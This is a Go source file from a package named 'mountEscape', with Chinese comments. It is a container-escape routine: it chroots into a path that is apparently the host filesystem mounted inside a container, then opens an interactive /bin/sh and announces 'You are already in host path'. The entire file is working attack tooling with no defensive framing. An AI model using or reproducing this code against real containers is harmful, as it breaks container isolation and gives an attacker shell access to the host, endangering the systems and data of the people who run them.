package mountEscape

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
)

func Chroot(rootPath string) (err error) {

	oldRootF, err := os.Open("/")
	if err != nil {
		return
	}
	defer oldRootF.Close()

	defer func() {
		if err = oldRootF.Chdir(); err != nil {
			return
		}
		if err = syscall.Chroot("."); err != nil {
			return
		}
	}()

	// 尝试对父进程进行 chroot 操作
	if err = syscall.Chroot(rootPath); err != nil {
		return
	}

	if err = os.Chdir("/"); err != nil {
		return
	}

	// 执行新的 /bin/sh 进程
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	fmt.Println("You are already in host path")
	if err = cmd.Run(); err != nil {
		return
	}

	return nil
}
